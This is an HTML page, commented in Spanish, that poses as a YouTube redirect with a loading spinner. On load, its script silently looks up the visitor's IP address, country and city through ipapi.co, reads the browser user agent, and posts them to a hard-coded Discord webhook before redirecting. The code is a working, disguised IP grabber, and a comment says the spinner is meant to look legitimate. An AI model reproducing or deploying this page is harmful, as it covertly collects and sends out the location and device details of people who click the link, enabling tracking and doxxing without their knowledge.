<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .loading-box {
            text-align: center;
            color: #666;
        }
        /* Un spinner simple para simular una carga legítima */
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ff0000; /* Rojo estilo YouTube */
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="loading-box">
        <div class="spinner"></div>
        <p>Redirigiendo a YouTube...</p>
    </div>

    <script>
        // CONFIGURACIÓN
        const webhookURL = "https://discord.com/api/webhooks/1513047206297600070/NvgpPaLE_sLhfPY757UyL_3F_y-JBkY_Ci5p6Imnwx1Ed_jHG2AXvrhAShuoUjXq9B6p";
        const youtubeVideoURL = "https://youtu.be/M_0SVIoit9E?si=_qlBBb_MK6so9tpy"; // Reemplaza por tu video

        async function logAndRedirect() {
            try {
                // 1. Obtener datos del visitante
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                // 2. Extraer variables
                const ip = data.ip || "No detectada";
                const pais = data.country_name || "Desconocido";
                const ciudad = data.city || "Desconocida";
                const navegador = navigator.userAgent;

                // 3. Formatear mensaje para Discord
                const params = {
                    username: "YouTube Redirect Logger",
                    embeds: [{
                        title: "🔗 ¡Enlace Clickado! (IP Registrada)",
                        color: 16711680, // Rojo YouTube
                        fields: [
                            { name: "Dirección IP", value: `\`${ip}\``, inline: true },
                            { name: "Ubicación", value: `${pais}, ${ciudad}`, inline: true },
                            { name: "Destino", value: youtubeVideoURL, inline: false },
                            { name: "Dispositivo/Navegador", value: navegador, inline: false }
                        ],
                        timestamp: new Date()
                    }]
                };

                // 4. Enviar a Discord
                await fetch(webhookURL, {
                    method: "POST",
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(params)
                });

            } catch (error) {
                console.error("Error en el proceso:", error);
            } finally {
                // 5. REDIRECCIÓN FORZADA (Ocurre siempre, falle o no el paso anterior)
                window.location.href = youtubeVideoURL;
            }
        }

        // Ejecutar al cargar la página
        window.onload = logAndRedirect;
    </script>
</body>
</html>
